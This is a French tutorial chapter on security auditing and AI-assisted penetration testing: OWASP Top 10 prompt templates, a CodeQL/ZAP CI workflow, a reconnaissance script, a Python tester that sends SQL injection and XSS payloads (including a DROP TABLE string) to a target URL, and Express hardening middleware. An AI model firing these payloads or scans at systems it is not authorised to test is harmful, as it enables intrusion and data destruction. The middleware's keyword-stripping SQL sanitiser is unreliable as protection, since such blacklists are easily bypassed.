# 📖 Partie IV - Chapitre 2 : Audits de sécurité et pentest assisté

## 🎯 Objectif du chapitre

Maîtriser les techniques d'audit de sécurité, le pentest assisté par IA, et l'implémentation des meilleures pratiques de sécurité dans le développement et les opérations.

## 🔒 Security Assessment : Audits automatisés

### 1. 🛡️ OWASP Security Testing

```
Tu es un expert sécurité OWASP et penetration testing.

TA TÂCHE : Effectuer un audit de sécurité complet selon OWASP Top 10 pour [APPLICATION]

OWASP TOP 10 2021 :
1. **A01:2021 - Broken Access Control** : Authorization flaws
2. **A02:2021 - Cryptographic Failures** : Encryption issues
3. **A03:2021 - Injection** : SQL injection, XSS, etc.
4. **A04:2021 - Insecure Design** : Architecture flaws
5. **A05:2021 - Security Misconfiguration** : Default configs
6. **A06:2021 - Vulnerable Components** : Outdated libraries
7. **A07:2021 - Identification Failures** : Auth weaknesses
8. **A08:2021 - Software Integrity** : CI/CD security
9. **A09:2021 - Logging Failures** : Insufficient logging
10. **A10:2021 - Server-Side Request Forgery** : SSRF

CONTRAINTES :
- Framework : [REACT/LARAVEL/NODE.JS]
- Authentication : [JWT/OAUTH/SAML]
- Database : [SQL/NoSQL]
- Cloud : [AWS/AZURE/GCP]
- Compliance : [GDPR/HIPAA/SOX]

FORMAT DE SORTIE :
1. OWASP Top 10 assessment methodology
2. Automated security scanning setup
3. Manual testing checklist
4. Vulnerability exploitation demos
5. Code fixes et hardening
6. Security monitoring implementation
7. Compliance reporting

QUALITÉ : Audit sécurité complet, OWASP compliant, remédié
```

**OWASP Top 10 Assessment Framework :**
```typescript
interface OWASPAudit {
  category: string;
  riskLevel: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  description: string;
  examples: string[];
  testing: {
    automated: string[];
    manual: string[];
  };
  remediation: string[];
  prevention: string[];
}

const owasp2021Audit: OWASPAudit[] = [
  {
    category: 'A01:2021 - Broken Access Control',
    riskLevel: 'HIGH',
    description: 'Authorization flaws allowing unauthorized access',
    examples: [
      'IDOR (Insecure Direct Object Reference)',
      'Privilege escalation',
      'Missing authorization checks',
      'Role-based access control bypass'
    ],
    testing: {
      automated: [
        'Check for missing authorization middleware',
        'Test role-based access with different users',
        'Validate API endpoints authorization',
        'Scan for IDOR vulnerabilities'
      ],
      manual: [
        'Test privilege escalation scenarios',
        'Verify horizontal/vertical access control',
        'Check session management security',
        'Test logout functionality'
      ]
    },
    remediation: [
      'Implement proper authorization middleware',
      'Use role-based access control (RBAC)',
      'Validate user permissions on each request',
      'Implement proper session management'
    ],
    prevention: [
      'Code reviews for access control',
      'Security testing in CI/CD pipeline',
      'Principle of least privilege',
      'Regular security assessments'
    ]
  },
  {
    category: 'A03:2021 - Injection',
    riskLevel: 'CRITICAL',
    description: 'Injection flaws allowing code execution',
    examples: [
      'SQL injection',
      'NoSQL injection',
      'XSS (Cross-Site Scripting)',
      'Command injection',
      'LDAP injection'
    ],
    testing: {
      automated: [
        'SQL injection testing with sqlmap',
        'XSS vulnerability scanning',
        'Input validation testing',
        'ORM usage verification'
      ],
      manual: [
        'Test with malicious payloads',
        'Verify input sanitization',
        'Check prepared statements usage',
        'Test different injection vectors'
      ]
    },
    remediation: [
      'Use prepared statements and parameterized queries',
      'Implement input validation and sanitization',
      'Use ORM frameworks properly',
      'Escape special characters in output'
    ],
    prevention: [
      'Input validation at all layers',
      'Contextual output escaping',
      'Security headers implementation',
      'Content Security Policy (CSP)'
    ]
  }
];
```

### 2. 🧪 Automated Security Testing

```
Tu es un expert automated security testing et SAST/DAST.

TA TÂCHE : Implémenter des tests de sécurité automatisés pour [APPLICATION]

OUTILS DE SÉCURITÉ :
1. **SAST (Static Application Security Testing)** : Code analysis
2. **DAST (Dynamic Application Security Testing)** : Runtime testing
3. **IAST (Interactive Application Security Testing)** : Runtime + code
4. **Dependency Scanning** : Vulnerable libraries detection
5. **Container Scanning** : Docker image vulnerabilities
6. **Infrastructure Scanning** : Cloud security assessment

CONTRAINTES :
- Integration in CI/CD pipeline
- False positive management
- Performance impact minimal
- Compliance requirements
- Cost optimization

FORMAT DE SORTIE :
1. Security testing strategy
2. SAST configuration (SonarQube, CodeQL)
3. DAST setup (OWASP ZAP, Burp Suite)
4. Dependency scanning (npm audit, Snyk)
5. Container security (Trivy, Clair)
6. Infrastructure scanning (Checkov, Terrascan)
7. CI/CD security integration

QUALITÉ : Security testing automatisé, CI/CD intégré, compliant
```

**Configuration SAST avec CodeQL :**
```yaml
# .github/workflows/security.yml
name: Security Scanning

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main, develop ]
  schedule:
    - cron: '0 2 * * 1' # Weekly on Monday

jobs:
  codeql-analysis:
    name: CodeQL Analysis
    runs-on: ubuntu-latest
    permissions:
      actions: read
      contents: read
      security-events: write

    steps:
    - name: Checkout repository
      uses: actions/checkout@v3

    - name: Initialize CodeQL
      uses: github/codeql-action/init@v2
      with:
        languages: javascript, typescript, python, java
        queries: security-and-quality

    - name: Autobuild
      uses: github/codeql-action/autobuild@v2

    - name: Perform CodeQL Analysis
      uses: github/codeql-action/analyze@v2

  dependency-scan:
    name: Dependency Security Scan
    runs-on: ubuntu-latest

    steps:
    - name: Checkout repository
      uses: actions/checkout@v3

    - name: Setup Node.js
      uses: actions/setup-node@v3
      with:
        node-version: 18
        cache: 'npm'

    - name: Install dependencies
      run: npm ci

    - name: Run npm audit
      run: npm audit --audit-level high

    - name: Run Snyk to check for vulnerabilities
      uses: snyk/actions/node@master
      continue-on-error: true
      env:
        SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
      with:
        args: --severity-threshold=high

    - name: Run Trivy vulnerability scanner
      uses: aquasecurity/trivy-action@master
      with:
        scan-type: 'fs'
        scan-ref: '.'
        format: 'sarif'
        output: 'trivy-results.sarif'

    - name: Upload Trivy scan results
      uses: github/codeql-action/upload-sarif@v2
      if: always()
      with:
        sarif_file: 'trivy-results.sarif'

  sast-scan:
    name: Static Application Security Testing
    runs-on: ubuntu-latest

    steps:
    - name: Checkout repository
      uses: actions/checkout@v3

    - name: Run Bandit (Python security linter)
      uses: tj-actions/bandit@v5
      if: contains(github.event.head_commit.modified, '.py')
      with:
        path: '.'

    - name: Run ESLint with security plugin
      run: |
        cd frontend && npm install eslint-plugin-security
        npx eslint . --ext .js,.jsx,.ts,.tsx

    - name: Run SonarQube analysis
      uses: sonarsource/sonarqube-scan-action@master
      env:
        SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
        SONAR_HOST_URL: ${{ secrets.SONAR_HOST_URL }}

  dast-scan:
    name: Dynamic Application Security Testing
    runs-on: ubuntu-latest
    needs: [dependency-scan, sast-scan]

    steps:
    - name: Checkout repository
      uses: actions/checkout@v3

    - name: Build and start application
      run: |
        docker-compose up -d
        # Wait for application to be ready
        timeout 300 bash -c 'until curl -f http://localhost:3000/health; do sleep 2; done'

    - name: Run OWASP ZAP security scan
      uses: zaproxy/action-baseline@v0.7.0
      with:
        target: 'http://localhost:3000'
        cmd-args: '--auto --ajax'

    - name: Run Nikto web server scanner
      uses: sullo/nikto-scan@v0.3.0
      with:
        target: 'http://localhost:3000'
        arguments: '-h http://localhost:3000 -Format json'

    - name: Stop application
      run: docker-compose down
```

## 🕵️ Penetration Testing : Tests d'intrusion assistés

### 1. 🔍 Web Application Penetration Testing

```
Tu es un expert penetration testing et ethical hacking.

TA TÂCHE : Effectuer des tests de pénétration assistés pour [APPLICATION]

PHASES DE PENTEST :
1. **Reconnaissance** : Information gathering, OSINT
2. **Scanning** : Port scanning, service enumeration
3. **Gaining Access** : Vulnerability exploitation
4. **Maintaining Access** : Persistence, privilege escalation
5. **Analysis** : Impact assessment, data exfiltration
6. **Reporting** : Findings, remediation, retest

CONTRAINTES :
- Rules of engagement
- Scope definition
- Black box / grey box / white box
- Time constraints
- Legal compliance

FORMAT DE SORTIE :
1. Pentest methodology et scope
2. Reconnaissance findings
3. Vulnerability exploitation
4. Impact assessment
5. Remediation recommendations
6. Retest validation
7. Executive summary

QUALITÉ : Pentest méthodique, findings documentés, remédiés
```

**Exemple de pentest workflow :**
```bash
#!/bin/bash
# Automated reconnaissance script

TARGET=$1
REPORT_DIR="pentest-report-$(date +%Y%m%d)"

echo "[+] Starting reconnaissance for $TARGET"
mkdir -p $REPORT_DIR

# WHOIS lookup
echo "[+] WHOIS information"
whois $TARGET > $REPORT_DIR/whois.txt

# DNS enumeration
echo "[+] DNS enumeration"
dig $TARGET > $REPORT_DIR/dig.txt
dig -t MX $TARGET >> $REPORT_DIR/dig.txt
dig -t NS $TARGET >> $REPORT_DIR/dig.txt

# Subdomain enumeration
echo "[+] Subdomain enumeration"
subfinder -d $TARGET -o $REPORT_DIR/subdomains.txt
sublist3r -d $TARGET -o $REPORT_DIR/sublist3r.txt

# Port scanning
echo "[+] Port scanning"
nmap -sV -sC -p- $TARGET > $REPORT_DIR/nmap-full.txt
nmap -sS -A -T4 $TARGET > $REPORT_DIR/nmap-stealth.txt

# Web reconnaissance
echo "[+] Web reconnaissance"
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -o $REPORT_DIR/gobuster.txt
dirb http://$TARGET $REPORT_DIR/dirb.txt

# SSL/TLS analysis
echo "[+] SSL/TLS analysis"
sslscan $TARGET > $REPORT_DIR/sslscan.txt
testssl.sh $TARGET > $REPORT_DIR/testssl.txt

# HTTP headers analysis
echo "[+] HTTP headers analysis"
curl -I http://$TARGET > $REPORT_DIR/headers.txt

echo "[+] Reconnaissance complete. Check $REPORT_DIR/"
```

### 2. 🛠️ Vulnerability Exploitation

```
Tu es un expert vulnerability assessment et exploitation.

TA TÂCHE : Identifier et exploiter les vulnérabilités dans [APPLICATION]

VULNÉRABILITÉS COMMUNES :
1. **SQL Injection** : Error-based, blind, time-based
2. **XSS** : Reflected, stored, DOM-based
3. **CSRF** : Cross-Site Request Forgery
4. **IDOR** : Insecure Direct Object Reference
5. **XXE** : XML External Entity
6. **File Upload** : Unrestricted file upload
7. **Authentication Bypass** : Weak auth mechanisms

CONTRAINTES :
- No production exploitation
- Proof of concept only
- Controlled environment
- Impact assessment
- Remediation guidance

FORMAT DE SORTIE :
1. Vulnerability identification
2. Exploitation methodology
3. Proof of concept code
4. Impact assessment
5. Remediation steps
6. Prevention measures
7. Risk rating (CVSS)

QUALITÉ : Vulnérabilités identifiées, impact évalué, remédiées
```

**Exemple d'exploitation SQL Injection :**
```python
#!/usr/bin/env python3
"""
SQL Injection testing tool - Educational purposes only
"""

import requests
import sys

class SQLInjectionTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()

    def test_error_based_sqli(self, parameter):
        """Test for error-based SQL injection"""
        payloads = [
            "'",
            "''",
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "'; DROP TABLE users--",
            "' UNION SELECT 1,2,3--",
        ]

        for payload in payloads:
            test_url = self.target_url.replace(f"{{{parameter}}}", payload)
            try:
                response = self.session.get(test_url, timeout=5)

                # Check for common SQL error messages
                sql_errors = [
                    'SQL syntax',
                    'mysql_fetch_array',
                    'ORA-01756',
                    'PostgreSQL',
                    'SQLite/JDBCDriver',
                    'Microsoft OLE DB Provider for ODBC Drivers'
                ]

                if any(error in response.text for error in sql_errors):
                    return {
                        'vulnerable': True,
                        'type': 'Error-based SQL Injection',
                        'payload': payload,
                        'response': response.text[:500]
                    }

            except requests.exceptions.RequestException:
                continue

        return {'vulnerable': False}

    def test_blind_sqli(self, parameter):
        """Test for blind SQL injection"""
        blind_payloads = [
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
        ]

        baseline_time = self._get_response_time(self.target_url)

        for payload in blind_payloads:
            test_url = self.target_url.replace(f"{{{parameter}}}", payload)
            response_time = self._get_response_time(test_url)

            if response_time > baseline_time + 3:  # 3 second threshold
                return {
                    'vulnerable': True,
                    'type': 'Time-based Blind SQL Injection',
                    'payload': payload,
                    'response_time': response_time
                }

        return {'vulnerable': False}

    def _get_response_time(self, url):
        """Get response time for a URL"""
        try:
            response = self.session.get(url, timeout=10)
            return response.elapsed.total_seconds()
        except:
            return 0

    def test_xss(self, parameter):
        """Test for XSS vulnerabilities"""
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            'javascript:alert("XSS")',
            '<svg onload=alert("XSS")>',
            '<body onload=alert("XSS")>',
        ]

        for payload in xss_payloads:
            test_url = self.target_url.replace(f"{{{parameter}}}", payload)
            try:
                response = self.session.get(test_url, timeout=5)

                if payload in response.text:
                    return {
                        'vulnerable': True,
                        'type': 'Cross-Site Scripting (XSS)',
                        'payload': payload,
                        'response': response.text[:500]
                    }

            except requests.exceptions.RequestException:
                continue

        return {'vulnerable': False}

def main():
    if len(sys.argv) != 2:
        print("Usage: python sqli_tester.py <target_url>")
        print("Example: python sqli_tester.py 'http://example.com/product?id=1'")
        sys.exit(1)

    target = sys.argv[1]
    tester = SQLInjectionTester(target)

    print(f"[+] Testing {target}")
    print("=" * 50)

    # Extract parameter from URL
    if '?' in target and '=' in target:
        parameter = target.split('=')[0].split('?')[1]
        if '{' in parameter and '}' in parameter:
            parameter = parameter.strip('{}')
        else:
            parameter = 'id'  # default

        print(f"[+] Testing parameter: {parameter}")
        print("-" * 30)

        # Test SQL Injection
        print("[+] Testing SQL Injection...")
        sqli_result = tester.test_error_based_sqli(parameter)
        if sqli_result['vulnerable']:
            print("❌ VULNERABLE: SQL Injection")
            print(f"   Payload: {sqli_result['payload']}")
            print(f"   Type: {sqli_result['type']}")
        else:
            print("✅ Not vulnerable to SQL Injection")

        # Test Blind SQL Injection
        blind_result = tester.test_blind_sqli(parameter)
        if blind_result['vulnerable']:
            print("❌ VULNERABLE: Blind SQL Injection")
            print(f"   Payload: {blind_result['payload']}")
        else:
            print("✅ Not vulnerable to Blind SQL Injection")

        # Test XSS
        print("\n[+] Testing XSS...")
        xss_result = tester.test_xss(parameter)
        if xss_result['vulnerable']:
            print("❌ VULNERABLE: XSS")
            print(f"   Payload: {xss_result['payload']}")
        else:
            print("✅ Not vulnerable to XSS")

    else:
        print("[-] Invalid URL format. Expected: http://example.com/page?param=value")

if __name__ == "__main__":
    main()
```

## 🔐 Security Hardening : Implémentation sécurisée

### 1. 🛡️ Application Security Hardening

```
Tu es un expert application security et secure coding.

TA TÂCHE : Sécuriser [APPLICATION] selon les best practices

SÉCURITÉ À IMPLÉMENTER :
1. **Authentication** : JWT, OAuth2, MFA
2. **Authorization** : RBAC, ABAC, policies
3. **Input Validation** : Sanitization, escaping
4. **Session Management** : Secure cookies, rotation
5. **Error Handling** : Information disclosure prevention
6. **File Upload** : Security, validation, scanning
7. **API Security** : Rate limiting, CORS, headers

CONTRAINTES :
- OWASP compliance
- Performance impact minimal
- User experience preserved
- Compliance requirements
- Regular security updates

FORMAT DE SORTIE :
1. Security architecture design
2. Authentication implementation
3. Authorization policies
4. Input validation framework
5. Security middleware
6. Error handling strategy
7. Security testing

QUALITÉ : Application sécurisée, OWASP compliant, testée
```

**Exemple de middleware de sécurité Express :**
```typescript
// src/middleware/security.ts
import helmet from 'helmet';
import rateLimit from 'express-rate-limit';
import cors from 'cors';
import { Request, Response, NextFunction } from 'express';

// Security headers with helmet
export const securityHeaders = helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      scriptSrc: ["'self'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "https:"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"],
    },
  },
  crossOriginEmbedderPolicy: false,
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  },
  noSniff: true,
  frameguard: { action: 'deny' },
  xssFilter: true,
});

// CORS configuration
export const corsOptions: cors.CorsOptions = {
  origin: function (origin, callback) {
    // Allow requests with no origin (mobile apps, etc.)
    if (!origin) return callback(null, true);

    const allowedOrigins = [
      'https://myapp.com',
      'https://www.myapp.com',
      'https://staging.myapp.com'
    ];

    if (allowedOrigins.indexOf(origin) !== -1) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
  exposedHeaders: ['X-Total-Count', 'X-Page-Count'],
  optionsSuccessStatus: 200
};

// Rate limiting
export const createRateLimit = (options: {
  windowMs?: number;
  max?: number;
  message?: string;
  standardHeaders?: boolean;
  legacyHeaders?: boolean;
}) => {
  return rateLimit({
    windowMs: options.windowMs || 15 * 60 * 1000, // 15 minutes
    max: options.max || 100, // limit each IP to 100 requests per windowMs
    message: options.message || {
      success: false,
      message: 'Too many requests from this IP, please try again later.',
      retryAfter: Math.ceil((options.windowMs || 900000) / 1000)
    },
    standardHeaders: options.standardHeaders ?? true,
    legacyHeaders: options.legacyHeaders ?? false,
    handler: (req, res) => {
      res.status(429).json(options.message);
    },
    skip: (req) => {
      // Skip rate limiting for health checks
      return req.path === '/health';
    }
  });
};

// Global rate limiter
export const globalRateLimit = createRateLimit({
  windowMs: 15 * 60 * 1000,
  max: 1000,
  message: 'Too many requests, please try again later.'
});

// Authentication rate limiter (stricter)
export const authRateLimit = createRateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: 'Too many authentication attempts, please try again later.'
});

// API rate limiter
export const apiRateLimit = createRateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  message: 'API rate limit exceeded, please try again later.'
});

// Input validation middleware
export const validateInput = (schema: any) => {
  return (req: Request, res: Response, next: NextFunction) => {
    const { error } = schema.validate(req.body);

    if (error) {
      return res.status(400).json({
        success: false,
        message: 'Validation failed',
        errors: error.details.map(detail => ({
          field: detail.path.join('.'),
          message: detail.message
        }))
      });
    }

    next();
  };
};

// SQL injection prevention
export const sanitizeSqlInput = (req: Request, res: Response, next: NextFunction) => {
  // Remove potentially dangerous SQL keywords
  const dangerousPatterns = [
    /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|UNION|SCRIPT)\b)/gi,
    /(--|#|\/\*|\*\/)/g,
    /(\bor\b|\band\b)\s+\d+\s*=\s*\d+/gi,
    /('|(\\')|("|\\")|(;))/g
  ];

  // Sanitize query parameters
  Object.keys(req.query).forEach(key => {
    if (typeof req.query[key] === 'string') {
      req.query[key] = dangerousPatterns.reduce((value, pattern) => {
        return value.replace(pattern, '');
      }, req.query[key]);
    }
  });

  // Sanitize body parameters
  if (req.body && typeof req.body === 'object') {
    Object.keys(req.body).forEach(key => {
      if (typeof req.body[key] === 'string') {
        req.body[key] = dangerousPatterns.reduce((value, pattern) => {
          return value.replace(pattern, '');
        }, req.body[key]);
      }
    });
  }

  next();
};

// Security audit logging
export const securityLogger = (req: Request, res: Response, next: NextFunction) => {
  const timestamp = new Date().toISOString();
  const ip = req.ip || req.connection.remoteAddress;
  const userAgent = req.get('User-Agent');
  const method = req.method;
  const url = req.originalUrl;

  // Log security-relevant events
  if (method === 'POST' || method === 'PUT' || method === 'DELETE') {
    console.log(`[${timestamp}] SECURITY - ${method} ${url} - IP: ${ip} - UA: ${userAgent}`);
  }

  // Add security headers to response
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');

  next();
};
```

### 2. 🔐 Authentication et Authorization

```
Tu es un expert authentication et authorization systems.

TA TÂCHE : Implémenter un système d'auth robuste pour [APPLICATION]

SYSTÈME D'AUTH :
1. **JWT Authentication** : Token-based auth
2. **OAuth2/OIDC** : Third-party authentication
3. **MFA** : Multi-factor authentication
4. **Session Management** : Secure session handling
5. **Authorization** : RBAC/ABAC policies
6. **Audit Logging** : Security event logging

CONTRAINTES :
- OWASP authentication guidelines
- GDPR compliance
- Performance requirements
- User experience
- Security standards

FORMAT DE SORTIE :
1. Authentication architecture
2. JWT implementation
3. OAuth2 integration
4. MFA setup
5. RBAC policies
6. Session management
7. Security monitoring

QUALITÉ : Authentification robuste, sécurisée, user-friendly
```

## 📊 Compliance et Governance

### 1. 🏛️ Security Compliance

```
Tu es un expert security compliance et governance.

TA TÂCHE : Implémenter la compliance sécurité pour [STANDARDS]

STANDARDS DE COMPLIANCE :
1. **GDPR** : General Data Protection Regulation
2. **HIPAA** : Health Insurance Portability
3. **PCI-DSS** : Payment Card Industry
4. **SOX** : Sarbanes-Oxley Act
5. **ISO 27001** : Information Security Management
6. **SOC 2** : Service Organization Control

CONTRAINTES :
- Regulatory requirements
- Data protection
- Privacy by design
- Audit trails
- Regular assessments

FORMAT DE SORTIE :
1. Compliance assessment
2. Gap analysis
3. Implementation plan
4. Security controls
5. Audit procedures
6. Documentation
7. Continuous monitoring

QUALITÉ : Compliance implémentée, auditée, documentée
```

## 📝 Templates de sécurité

### 🛡️ Template Security Audit
```
Tu es un expert security auditing et OWASP.

TA TÂCHE : Auditer la sécurité de [APPLICATION]

OWASP TOP 10 :
- Broken Access Control
- Cryptographic Failures
- Injection
- Insecure Design
- Security Misconfiguration

CONTRAINTES :
- [FRAMEWORK] specific
- [COMPLIANCE] requirements
- Risk tolerance [LEVEL]
- Testing scope [LIMITED/FULL]

FORMAT :
1. Audit methodology
2. OWASP assessment
3. Vulnerability findings
4. Risk assessment
5. Remediation plan
6. Security hardening
7. Compliance report

QUALITÉ : Audit sécurité complet, findings prioritaires, remédiés
```

### 🕵️ Template Penetration Testing
```
Tu es un expert penetration testing et ethical hacking.

TA TÂCHE : Effectuer pentest pour [APPLICATION]

PHASES :
- Reconnaissance et OSINT
- Scanning et enumeration
- Vulnerability assessment
- Exploitation (PoC only)
- Post-exploitation analysis

CONTRAINTES :
- Rules of engagement
- Scope definition
- Black/grey/white box
- Time constraints
- No production impact

FORMAT :
1. Pentest methodology
2. Reconnaissance findings
3. Vulnerability exploitation
4. Impact assessment
5. Remediation guidance
6. Retest validation
7. Executive summary

QUALITÉ : Pentest méthodique, findings documentés, actionable
```

### 🔐 Template Security Hardening
```
Tu es un expert secure coding et application security.

TA TÂCHE : Sécuriser [APPLICATION] selon best practices

SÉCURITÉ :
- Authentication robuste
- Authorization policies
- Input validation
- Error handling
- Security headers

CONTRAINTES :
- OWASP compliance
- Performance impact minimal
- User experience preserved
- Regular updates

FORMAT :
1. Security architecture
2. Authentication system
3. Authorization framework
4. Input validation
5. Security middleware
6. Error handling
7. Testing validation

QUALITÉ : Application sécurisée, OWASP compliant, hardened
```

## 🎯 Points clés à retenir

1. **OWASP Top 10** : Framework de sécurité standard
2. **SAST/DAST** : Tests de sécurité automatisés
3. **Pentest** : Tests d'intrusion méthodiques
4. **Authentication** : Multi-facteur, JWT, OAuth2
5. **Authorization** : RBAC, ABAC, least privilege
6. **Compliance** : GDPR, HIPAA, PCI-DSS, SOX

## 🚀 Prochain chapitre

Maintenant que vous maîtrisez la sécurité, découvrons la documentation automatisée du pipeline DevOps.

---

## 📋 Checklist qualité

- ✅ OWASP Top 10 assessment
- ✅ Automated security testing
- ✅ Penetration testing methodology
- ✅ Application security hardening
- ✅ Authentication et authorization
- ✅ Security compliance

## 🎯 Test de compréhension

**Question :** Quelle est la différence entre SAST et DAST ?

**Réponse attendue :** SAST (Static Application Security Testing) analyse le code source statiquement sans exécution, identifiant les vulnérabilités dans le code. DAST (Dynamic Application Security Testing) teste l'application en cours d'exécution, simulant des attaques réelles pour identifier les vulnérabilités runtime.

---

**Temps de lecture estimé : 90 minutes**
**Niveau : Expert**
**Prérequis : Partie I + II + III + Chapitre 1**
